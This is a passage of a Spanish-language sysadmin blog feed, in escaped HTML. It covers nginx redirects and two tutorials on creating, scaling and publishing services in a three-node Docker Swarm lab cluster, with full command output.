    root /srv/www/www.example.com&lt;span class="p"&gt;;&lt;/span&gt;
    index index.html&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

server &lt;span class="o"&gt;{&lt;/span&gt;
    listen &lt;span class="m"&gt;80&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    server_name example.com&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="m"&gt;301&lt;/span&gt; http://www.example.com&lt;span class="nv"&gt;$request_uri&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@aldebaran:~/docker/nginx_redirects$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si recreamos la imagen y la ejecutamos de nuevo, vemos que nuestra web se comporta de la forma especificada al principio del artículo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ curl -I http://example.com/
HTTP/1.1 &lt;span class="m"&gt;301&lt;/span&gt; Moved Permanently
Server: nginx/1.10.3
Date: Tue, &lt;span class="m"&gt;06&lt;/span&gt; Jun &lt;span class="m"&gt;2017&lt;/span&gt; &lt;span class="m"&gt;14&lt;/span&gt;:47:57 GMT
Content-Type: text/html
Content-Length: &lt;span class="m"&gt;185&lt;/span&gt;
Connection: keep-alive
Location: http://www.example.com/

gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De esta forma, el navegador buscará la nueva página, de acuerdo a esta respuesta. Se fuerza la opción "follow redirects" en la salida del &lt;strong&gt;curl&lt;/strong&gt; para poder observar este comportamiento:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ curl http://www.example.com/
example site
gerard@aldebaran:~$ curl http://www.otherdomain.com/
default site
gerard@aldebaran:~$ curl -L http://example.com/
example site
gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y lo mismo sería válido para forzar una redirección a HTTPS, aunque se deja como ejercicio al lector.&lt;/p&gt;</content><category term="nginx"></category><category term="redirecciones"></category></entry><entry><title>Uso básico de un cluster Docker Swarm</title><link href="http://www.linuxsysadmin.ml/2017/11/uso-basico-de-un-cluster-docker-swarm.html" rel="alternate"></link><published>2017-11-06T10:00:00+01:00</published><updated>2017-11-06T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-11-06:/2017/11/uso-basico-de-un-cluster-docker-swarm.html</id><summary type="html">&lt;p&gt;Usar un &lt;em&gt;cluster&lt;/em&gt; de &lt;strong&gt;docker swarm&lt;/strong&gt; no es transparente para nuestro uso; necesitamos cambiar de mentalidad y tener en cuenta algunos conceptos. Donde antes hablábamos de contenedores, aquí se habla de &lt;strong&gt;servicios&lt;/strong&gt;, que básicamente son un número variable de contenedores repartidos por los diferentes nodos del &lt;em&gt;cluster&lt;/em&gt; de forma balanceada …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Usar un &lt;em&gt;cluster&lt;/em&gt; de &lt;strong&gt;docker swarm&lt;/strong&gt; no es transparente para nuestro uso; necesitamos cambiar de mentalidad y tener en cuenta algunos conceptos. Donde antes hablábamos de contenedores, aquí se habla de &lt;strong&gt;servicios&lt;/strong&gt;, que básicamente son un número variable de contenedores repartidos por los diferentes nodos del &lt;em&gt;cluster&lt;/em&gt; de forma balanceada.&lt;/p&gt;
&lt;p&gt;Para trabajar con &lt;strong&gt;docker swarm&lt;/strong&gt; necesitamos trabajar desde un nodo &lt;em&gt;manager&lt;/em&gt;, y no desde los &lt;em&gt;workers&lt;/em&gt;. Por ello, el resto de comandos se van a lanzar en &lt;strong&gt;shangrila&lt;/strong&gt;, a menos que se diga lo contrario. En este artículo vamos a utilizar el que montamos en &lt;a href="http://www.linuxsysadmin.ml/2017/10/montando-un-cluster-de-docker-con-docker-swarm.html"&gt;este otro artículo&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Un servicio básico&lt;/h2&gt;
&lt;p&gt;Si queremos crear un servicio, podemos utilizar los subcomandos de &lt;code&gt;docker service&lt;/code&gt;. Una vez creado el servicio podemos trabajar con él sin problemas. Veamos una creación de un servicio básico:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@shangrila:~$ docker service create --replicas &lt;span class="m"&gt;1&lt;/span&gt; --name helloworld alpine ping docker.com
rl39orkjrie1r1vv0as368s8x
Since --detach&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;false&lt;/span&gt; was not specified, tasks will be created in the background.
In a future release, --detach&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;false&lt;/span&gt; will become the default.
gerard@shangrila:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Básicamente esto nos indica que queremos crear un servicio llamado &lt;em&gt;helloworld&lt;/em&gt;, ejecutando un contenedor &lt;em&gt;alpine&lt;/em&gt; y lanzando el comando &lt;code&gt;ping docker.com&lt;/code&gt;. El número de replicas inicial lo ponemos, por ejemplo, a 1; podemos escalarlo cuando queramos.&lt;/p&gt;
&lt;p&gt;Podemos ver el estado de nuestro servicio con &lt;code&gt;docker service ls&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@shangrila:~$ docker service ls
ID                  NAME                MODE                REPLICAS            IMAGE               PORTS
rl39orkjrie1        helloworld          replicated          &lt;span class="m"&gt;1&lt;/span&gt;/1                 alpine:latest
gerard@shangrila:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si necesitamos una información más detallada, podemos hacer un &lt;code&gt;docker service inspect&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@shangrila:~$ docker service inspect --pretty helloworld

ID:             rl39orkjrie1r1vv0as368s8x
Name:           helloworld
Service Mode:   Replicated
 Replicas:      &lt;span class="m"&gt;1&lt;/span&gt;
Placement:
UpdateConfig:
 Parallelism:   &lt;span class="m"&gt;1&lt;/span&gt;
 On failure:    pause
 Monitoring Period: 5s
 Max failure ratio: &lt;span class="m"&gt;0&lt;/span&gt;
 Update order:      stop-first
RollbackConfig:
 Parallelism:   &lt;span class="m"&gt;1&lt;/span&gt;
 On failure:    pause
 Monitoring Period: 5s
 Max failure ratio: &lt;span class="m"&gt;0&lt;/span&gt;
 Rollback order:    stop-first
ContainerSpec:
 Image:         alpine:latest@sha256:f006ecbb824d87947d0b51ab8488634bf69fe4094959d935c0c103f4820a417d
 Args:          ping docker.com
Resources:
Endpoint Mode:  vip
gerard@shangrila:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Con &lt;code&gt;docker service ps&lt;/code&gt; podemos saber en que nodos se encuentra nuestro servicio desplegado:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@shangrila:~$ docker service ps helloworld
ID                  NAME                IMAGE               NODE                DESIRED STATE       CURRENT STATE            ERROR               PORTS
q5xeb2bftqlq        helloworld.1        alpine:latest       eldorado            Running             Running &lt;span class="m"&gt;10&lt;/span&gt; minutes ago
gerard@shangrila:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Escalando el servicio&lt;/h2&gt;
&lt;p&gt;En el caso que necesitemos ajustar el número de nodos que ejecutan una copia, podemos escalar. Esto tampoco tiene ninguna complicación:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@shangrila:~$ docker service scale &lt;span class="nv"&gt;helloworld&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;
helloworld scaled to &lt;span class="m"&gt;4&lt;/span&gt;
gerard@shangrila:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Hemos escalado nuestro servicio por encima del número de nodos del &lt;strong&gt;swarm&lt;/strong&gt;. En este caso, esto no es un problema; solamante veremos que hay nodos con varios contenedores.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@shangrila:~$ docker service ls
ID                  NAME                MODE                REPLICAS            IMAGE               PORTS
rl39orkjrie1        helloworld          replicated          &lt;span class="m"&gt;4&lt;/span&gt;/4                 alpine:latest
gerard@shangrila:~$ docker service ps helloworld
ID                  NAME                IMAGE               NODE                DESIRED STATE       CURRENT STATE            ERROR               PORTS
q5xeb2bftqlq        helloworld.1        alpine:latest       eldorado            Running             Running &lt;span class="m"&gt;12&lt;/span&gt; minutes ago
6ruk3h9lvzom        helloworld.2        alpine:latest       shangrila           Running             Running &lt;span class="m"&gt;2&lt;/span&gt; seconds ago
j2xuo9pvfoeu        helloworld.3        alpine:latest       arcadia             Running             Running &lt;span class="m"&gt;2&lt;/span&gt; seconds ago
t2emtl7m6r3b        helloworld.4        alpine:latest       arcadia             Running             Running &lt;span class="m"&gt;2&lt;/span&gt; seconds ago
gerard@shangrila:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si se cayera un nodo, el mismo &lt;strong&gt;swarm&lt;/strong&gt; se encarga de levantar otro contenedor en un nodo vivo para sustituir los fallos posibles de este &lt;em&gt;downtime&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;erard@shangrila:~$ docker node ls
ID                            HOSTNAME            STATUS              AVAILABILITY        MANAGER STATUS
5p0wbl6rhvs5oo461xsmxhph4     eldorado            Down                Active
rtmzvsbndn4ox5mhzsgu2xi81 *   shangrila           Ready               Active              Leader
su20j7s0itgssfcm8x5whz8o8     arcadia             Ready               Active
gerard@shangrila:~$ docker service ls
ID                  NAME                MODE                REPLICAS            IMAGE               PORTS
rl39orkjrie1        helloworld          replicated          &lt;span class="m"&gt;4&lt;/span&gt;/4                 alpine:latest
gerard@shangrila:~$ docker service ps helloworld
ID                  NAME                IMAGE               NODE                DESIRED STATE       CURRENT STATE            ERROR               PORTS
j26p1q1hgvtt        helloworld.1        alpine:latest       shangrila           Running             Running &lt;span class="m"&gt;5&lt;/span&gt; seconds ago
q5xeb2bftqlq         &lt;span class="se"&gt;\_&lt;/span&gt; helloworld.1    alpine:latest       eldorado            Shutdown            Running &lt;span class="m"&gt;24&lt;/span&gt; seconds ago
6ruk3h9lvzom        helloworld.2        alpine:latest       shangrila           Running             Running &lt;span class="m"&gt;3&lt;/span&gt; minutes ago
j2xuo9pvfoeu        helloworld.3        alpine:latest       arcadia             Running             Running &lt;span class="m"&gt;3&lt;/span&gt; minutes ago
t2emtl7m6r3b        helloworld.4        alpine:latest       arcadia             Running             Running &lt;span class="m"&gt;3&lt;/span&gt; minutes ago
gerard@shangrila:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El contenedor &lt;em&gt;helloworld.1&lt;/em&gt; debería estar en &lt;strong&gt;eldorado&lt;/strong&gt;, pero como lo hemos apagado, se ha creado otro en su sustitución en &lt;strong&gt;shangrila&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Levantamos de nuevo &lt;strong&gt;eldorado&lt;/strong&gt;, y se vuelve al estado original, parando la instáncia de emergencia en &lt;strong&gt;shangrila&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@shangrila:~$ docker node ls
ID                            HOSTNAME            STATUS              AVAILABILITY        MANAGER STATUS
5p0wbl6rhvs5oo461xsmxhph4     eldorado            Ready               Active
rtmzvsbndn4ox5mhzsgu2xi81 *   shangrila           Ready               Active              Leader
su20j7s0itgssfcm8x5whz8o8     arcadia             Ready               Active
gerard@shangrila:~$ docker service ls
ID                  NAME                MODE                REPLICAS            IMAGE               PORTS
rl39orkjrie1        helloworld          replicated          &lt;span class="m"&gt;4&lt;/span&gt;/4                 alpine:latest
gerard@shangrila:~$ docker service ps helloworld
ID                  NAME                IMAGE               NODE                DESIRED STATE       CURRENT STATE             ERROR               PORTS
j26p1q1hgvtt        helloworld.1        alpine:latest       shangrila           Running             Running &lt;span class="m"&gt;3&lt;/span&gt; minutes ago
q5xeb2bftqlq         &lt;span class="se"&gt;\_&lt;/span&gt; helloworld.1    alpine:latest       eldorado            Shutdown            Shutdown &lt;span class="m"&gt;24&lt;/span&gt; seconds ago
6ruk3h9lvzom        helloworld.2        alpine:latest       shangrila           Running             Running &lt;span class="m"&gt;7&lt;/span&gt; minutes ago
j2xuo9pvfoeu        helloworld.3        alpine:latest       arcadia             Running             Running &lt;span class="m"&gt;7&lt;/span&gt; minutes ago
t2emtl7m6r3b        helloworld.4        alpine:latest       arcadia             Running             Running &lt;span class="m"&gt;7&lt;/span&gt; minutes ago
gerard@shangrila:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora, ya podemos eliminar este servicio de test, puesto que no lo vamos a necesitar más.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@shangrila:~$ docker service rm helloworld
helloworld
gerard@shangrila:~$ docker service ls
ID                  NAME                MODE                REPLICAS            IMAGE               PORTS
gerard@shangrila:~$ docker service ps helloworld
no such services: helloworld
gerard@shangrila:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Publicando servicios&lt;/h2&gt;
&lt;p&gt;Si deseamos exponer nuestro servicio, necesitamos indicarlo con el &lt;em&gt;flag&lt;/em&gt; &lt;code&gt;--publish&lt;/code&gt;, exactamente igual que el &lt;em&gt;flag&lt;/em&gt; &lt;code&gt;-p&lt;/code&gt; en &lt;strong&gt;docker-engine&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Veamos un ejemplo. Tenemos una imagen &lt;em&gt;sirrtea/myhostname&lt;/em&gt; que responde por HTTP en el puerto 8080, indicando el nombre del &lt;em&gt;host&lt;/em&gt; (el contenedor) en el que se ejecuta.&lt;/p&gt;
&lt;p&gt;Creamos el servicio con 2 replicas, y publicando el puerto 8080 del contenedor en el 8888 de los &lt;em&gt;hosts&lt;/em&gt; del &lt;em&gt;cluster&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@shangrila:~$ docker service create --replicas &lt;span class="m"&gt;2&lt;/span&gt; --name myhostname --publish &lt;span class="m"&gt;8888&lt;/span&gt;:8080 sirrtea/myhostname
c0pvrkvf233odc1z9piitf1wa
Since --detach&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;false&lt;/span&gt; was not specified, tasks will be created in the background.
In a future release, --detach&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;false&lt;/span&gt; will become the default.
gerard@shangrila:~$ docker service ls
ID                  NAME                MODE                REPLICAS            IMAGE                       PORTS
c0pvrkvf233o        myhostname          replicated          &lt;span class="m"&gt;2&lt;/span&gt;/2                 sirrtea/myhostname:latest   *:8888-&amp;gt;8080/tcp
gerard@shangrila:~$ docker service ps myhostname
ID                  NAME                IMAGE                       NODE                DESIRED STATE       CURRENT STATE           ERROR               PORTS
xnljno3f285w        myhostname.1        sirrtea/myhostname:latest   shangrila           Running             Running &lt;span class="m"&gt;3&lt;/span&gt; seconds ago
rivqb4uqqiwl        myhostname.2        sirrtea/myhostname:latest   eldorado            Running             Running &lt;span class="m"&gt;3&lt;/span&gt; seconds ago
gerard@shangrila:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De ahora en adelante, podemos acceder a &lt;strong&gt;cualquier nodo&lt;/strong&gt; en el puerto 8888 y obtendremos un balanceo de peticiones entre todos los contenedores que conforman el servicio.&lt;/p&gt;
&lt;p&gt;Es importante recalcar que, aunque el servicio solo tiene contenedores en &lt;strong&gt;shangrila&lt;/strong&gt; y en &lt;strong&gt;eldorado&lt;/strong&gt;, también vamos a obtener respuesta del balanceador en &lt;strong&gt;arcadia&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;En el caso de mi &lt;em&gt;cluster&lt;/em&gt;, no tengo resolución DNS, así que os resumo las IPs de mi &lt;em&gt;cluster&lt;/em&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;shangrila&lt;/strong&gt; &amp;rarr; 192.168.56.2&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;arcadia&lt;/strong&gt; &amp;rarr; 192.168.56.3&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;eldorado&lt;/strong&gt; &amp;rarr; 192.168.56.4&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@shangrila:~$ curl http://192.168.56.2:8888/
Hello world from &amp;lt;em&amp;gt;9294907313e7&amp;lt;/em&amp;gt;
gerard@shangrila:~$ curl http://192.168.56.2:8888/
Hello world from &amp;lt;em&amp;gt;5295009a7737&amp;lt;/em&amp;gt;
gerard@shangrila:~$ curl http://192.168.56.3:8888/
Hello world from &amp;lt;em&amp;gt;9294907313e7&amp;lt;/em&amp;gt;
gerard@shangrila:~$ curl http://192.168.56.3:8888/
Hello world from &amp;lt;em&amp;gt;5295009a7737&amp;lt;/em&amp;gt;
gerard@shangrila:~$ curl http://192.168.56.4:8888/
Hello world from &amp;lt;em&amp;gt;9294907313e7&amp;lt;/em&amp;gt;
gerard@shangrila:~$ curl http://192.168.56.4:8888/
Hello world from &amp;lt;em&amp;gt;5295009a7737&amp;lt;/em&amp;gt;
gerard@shangrila:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este caso concreto, el &lt;em&gt;hostname&lt;/em&gt; 9294907313e7 es el de la instancia de &lt;strong&gt;shangrila&lt;/strong&gt; y el &lt;em&gt;hostname&lt;/em&gt; 5295009a7737 corresponde a la intancia de &lt;strong&gt;eldorado&lt;/strong&gt;. Esto se puede comprobar fácilmente mirando en los nodos que albergan los contenedores.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@shangrila:~$ docker ps
CONTAINER ID        IMAGE                       COMMAND                  CREATED             STATUS              PORTS               NAMES
9294907313e7        sirrtea/myhostname:latest   &lt;span class="s2"&gt;&amp;quot;/usr/bin/gunicorn...&amp;quot;&lt;/span&gt;   &lt;span class="m"&gt;25&lt;/span&gt; minutes ago      Up &lt;span class="m"&gt;25&lt;/span&gt; minutes                           myhostname.1.xnljno3f285wkfl0xyfmb0xek
gerard@shangrila:~$ docker inspect myhostname.1.xnljno3f285wkfl0xyfmb0xek &lt;span class="p"&gt;|&lt;/span&gt; grep Hostname
        &lt;span class="s2"&gt;&amp;quot;HostnamePath&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;/var/lib/docker/containers/9294907313e78d46193dabb36eee2b6eb422208675812c77fdef96139cb0e62b/hostname&amp;quot;&lt;/span&gt;,
            &lt;span class="s2"&gt;&amp;quot;Hostname&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;9294907313e7&amp;quot;&lt;/span&gt;,
gerard@shangrila:~$

gerard@eldorado:~$ docker ps
CONTAINER ID        IMAGE                       COMMAND                  CREATED             STATUS              PORTS               NAMES
5295009a7737        sirrtea/myhostname:latest   &lt;span class="s2"&gt;&amp;quot;/usr/bin/gunicorn...&amp;quot;&lt;/span&gt;   &lt;span class="m"&gt;25&lt;/span&gt; minutes ago      Up &lt;span class="m"&gt;25&lt;/span&gt; minutes                           myhostname.2.rivqb4uqqiwlbla8716foavzy
gerard@eldorado:~$ docker inspect myhostname.2.rivqb4uqqiwlbla8716foavzy &lt;span class="p"&gt;|&lt;/span&gt; grep Hostname
        &lt;span class="s2"&gt;&amp;quot;HostnamePath&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;/var/lib/docker/containers/5295009a7737ef709260ea984b9c7720d6bd752a40d8305e86c2649c0ab2af10/hostname&amp;quot;&lt;/span&gt;,
            &lt;span class="s2"&gt;&amp;quot;Hostname&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;5295009a7737&amp;quot;&lt;/span&gt;,
gerard@eldorado:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La recomendación oficial para tener tener una única IP consiste en poner delante de todos los nodos un balanceador, especialmente uno que pueda descartar nodos parados como puede ser &lt;strong&gt;HAProxy&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Con eso ganamos balanceo entre todos los nodos del &lt;em&gt;cluster&lt;/em&gt; que queden vivos y, en caso de alcanzar alguno, un balanceo entre todas las instancias de un servicio dado.&lt;/p&gt;</content><category term="docker"></category><category term="swarm"></category><category term="cluster"></category><category term="uso"></category><category term="basico"></category></entry><entry><title>Montando un cluster de docker con docker swarm</title><link href="http://www.linuxsysadmin.ml/2017/10/montando-un-cluster-de-docker-con-docker-swarm.html" rel="alternate"></link><published>2017-10-30T10:00:00+01:00</published><updated>2017-10-30T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-10-30:/2017/10/montando-un-cluster-de-docker-con-docker-swarm.html</id><summary type="html">&lt;p&gt;Usar &lt;strong&gt;docker&lt;/strong&gt; en nuestro dia a dia es muy interesante y tiene un montón de aplicaciones prácticas; sin embargo no es la mejor opción confiar en un único servidor en producción. Para tener alta disponibilidad y alto renidmiento podemos montar un cluster, como por ejemplo su implementación oficial, &lt;strong&gt;docker swarm …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Usar &lt;strong&gt;docker&lt;/strong&gt; en nuestro dia a dia es muy interesante y tiene un montón de aplicaciones prácticas; sin embargo no es la mejor opción confiar en un único servidor en producción. Para tener alta disponibilidad y alto renidmiento podemos montar un cluster, como por ejemplo su implementación oficial, &lt;strong&gt;docker swarm&lt;/strong&gt;.&lt;/p&gt;
&lt;h2&gt;Preparando los servidores&lt;/h2&gt;
&lt;p&gt;Vamos a seguir el tutorial mismo de la página de docker, que nos invita a crear 3 servidores, siendo uno el &lt;em&gt;manager&lt;/em&gt; y el resto &lt;em&gt;nodos&lt;/em&gt;. Así pues, nuestro cluster se va a componer inicialmente de 3 servidores:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;shangrila&lt;/strong&gt; &amp;rarr; nuestro manager, con IP 192.168.56.2&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;arcadia&lt;/strong&gt; &amp;rarr; el nodo 1, con IP 192.168.56.3&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;eldorado&lt;/strong&gt; &amp;rarr; el nodo 2, con IP 192.168.56.4&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Para ello vamos a preparar tres máquinas que son las que van a componer el cluster de &lt;strong&gt;Docker&lt;/strong&gt;. Las máquinas solo necesitan &lt;strong&gt;docker&lt;/strong&gt; y me he guiado por &lt;a href="http://www.linuxsysadmin.ml/2017/07/montando-un-servidor-docker-con-debian-stretch.html"&gt;este artículo&lt;/a&gt;. Adicionalmente, he instalado el servicio &lt;strong&gt;NTP&lt;/strong&gt; siguiendo &lt;a href="http://www.linuxsysadmin.ml/2017/10/un-servicio-casi-imprescindible-ntp.html"&gt;este otro artículo&lt;/a&gt;, aunque esto es opcional.&lt;/p&gt;
&lt;p&gt;Un punto importante a tener en cuenta es que las máquinas deben tener &lt;a href="https://docs.docker.com/engine/swarm/swarm-tutorial/#the-ip-address-of-the-manager-machine"&gt;conectividad con el manager&lt;/a&gt;, y deben poder accederse entre ellas por &lt;a href="https://docs.docker.com/engine/swarm/swarm-tutorial/#open-protocols-and-ports-between-the-hosts"&gt;algunos puertos&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Creando el manager&lt;/h2&gt;
&lt;p&gt;Entramos por SSH en el manager (en nuestro caso &lt;strong&gt;shangrila&lt;/strong&gt;) y lanzamos el comando &lt;code&gt;docker swarm init&lt;/code&gt;. Esto nos va a crear un cluster con solamente un &lt;em&gt;manager&lt;/em&gt; y sin &lt;em&gt;nodos&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@shangrila:~$ docker swarm init --advertise-addr &lt;span class="m"&gt;192&lt;/span&gt;.168.56.2
Swarm initialized: current node &lt;span class="o"&gt;(&lt;/span&gt;rtmzvsbndn4ox5mhzsgu2xi81&lt;span class="o"&gt;)&lt;/span&gt; is now a manager.

To add a worker to this swarm, run the following command:

    docker swarm join --token SWMTKN-1-09ebvbcbqjttt3o6ssqfnkb1n4xuzf1e1jildujhkh7dpb6iaq-0i6smvy5g75h2mn82t8kv4ptd &lt;span class="m"&gt;192&lt;/span&gt;.168.56.2:2377

To add a manager to this swarm, run &lt;span class="s1"&gt;&amp;#39;docker swarm join-token manager&amp;#39;&lt;/span&gt; and follow the instructions.

gerard@shangrila:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;También hemos añadido el flag &lt;code&gt;--advertise-addr&lt;/code&gt; para indicar la IP del &lt;em&gt;manager&lt;/em&gt; que se va a usar para las comunicaciones con los diferentes nodos.&lt;/p&gt;
&lt;p&gt;Ahora ya tenemos un cluster de &lt;em&gt;docker swarm&lt;/em&gt; operativo, aunque al no tener &lt;em&gt;nodos&lt;/em&gt;, no podemos usar algunos de los comandos, que son multinodo.&lt;/p&gt;
&lt;p&gt;Podemos ver los nodos del cluster y el estado del mismo con unos pocos comandos:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@shangrila:~$ docker info
...
Swarm: active
 NodeID: rtmzvsbndn4ox5mhzsgu2xi81
 Is Manager: &lt;span class="nb"&gt;true&lt;/span&gt;
 ClusterID: krknl2v0llpyczyqg1ihi250d
 Managers: &lt;span class="m"&gt;1&lt;/span&gt;
 Nodes: &lt;span class="m"&gt;1&lt;/span&gt;
 Orchestration:
  Task History Retention Limit: &lt;span class="m"&gt;5&lt;/span&gt;
 Raft:
  Snapshot Interval: &lt;span class="m"&gt;10000&lt;/span&gt;
  Number of Old Snapshots to Retain: &lt;span class="m"&gt;0&lt;/span&gt;
  Heartbeat Tick: &lt;span class="m"&gt;1&lt;/span&gt;
  Election Tick: &lt;span class="m"&gt;3&lt;/span&gt;
 Dispatcher:
  Heartbeat Period: &lt;span class="m"&gt;5&lt;/span&gt; seconds
 CA Configuration:
  Expiry Duration: &lt;span class="m"&gt;3&lt;/span&gt; months
  Force Rotate: &lt;span class="m"&gt;0&lt;/span&gt;
 Root Rotation In Progress: &lt;span class="nb"&gt;false&lt;/span&gt;
 Node Address: &lt;span class="m"&gt;192&lt;/span&gt;.168.56.2
 Manager Addresses:
  &lt;span class="m"&gt;192&lt;/span&gt;.168.56.2:2377
...
gerard@shangrila:~$ docker node ls
ID                            HOSTNAME            STATUS              AVAILABILITY        MANAGER STATUS
rtmzvsbndn4ox5mhzsgu2xi81 *   shangrila           Ready               Active              Leader
gerard@shangrila:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Añadiendo nodos al cluster&lt;/h2&gt;
&lt;p&gt;Para añadir un &lt;em&gt;nodo&lt;/em&gt; en el cluster, solo tenemos que entrar en ese nodo y lanzar el comando que nos sugirió el &lt;code&gt;docker init&lt;/code&gt;. Si no nos acordamos, siempre podemos pedir que nos lo repita:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@shangrila:~$ docker swarm join-token worker
To add a worker to this swarm, run the following command:

    docker swarm join --token SWMTKN-1-09ebvbcbqjttt3o6ssqfnkb1n4xuzf1e1jildujhkh7dpb6iaq-0i6smvy5g75h2mn82t8kv4ptd &lt;span class="m"&gt;192&lt;/span&gt;.168.56.2:2377

gerard@shangrila:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Así tal cual, lanzamos el comando en cualquier &lt;em&gt;nodo&lt;/em&gt; que deseemos preparar ahora. No es necesario poner todos los &lt;em&gt;nodos&lt;/em&gt; en este momento, pudiendo añadir &lt;em&gt;nodos&lt;/em&gt; en un futuro, tal como nuestro cluster lo vaya necesitando.&lt;/p&gt;
&lt;p&gt;Lanzamos en &lt;strong&gt;arcadia&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@arcadia:~$ docker swarm join --token SWMTKN-1-09ebvbcbqjttt3o6ssqfnkb1n4xuzf1e1jildujhkh7dpb6iaq-0i6smvy5g75h2mn82t8kv4ptd &lt;span class="m"&gt;192&lt;/span&gt;.168.56.2:2377
This node joined a swarm as a worker.
gerard@arcadia:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y lanzamos en &lt;strong&gt;eldorado&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@eldorado:~$ docker swarm join --token SWMTKN-1-09ebvbcbqjttt3o6ssqfnkb1n4xuzf1e1jildujhkh7dpb6iaq-0i6smvy5g75h2mn82t8kv4ptd &lt;span class="m"&gt;192&lt;/span&gt;.168.56.2:2377
This node joined a swarm as a worker.
gerard@eldorado:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y podemos comprobar de nuevo el estado de nuestro cluster:&lt;/p&gt;
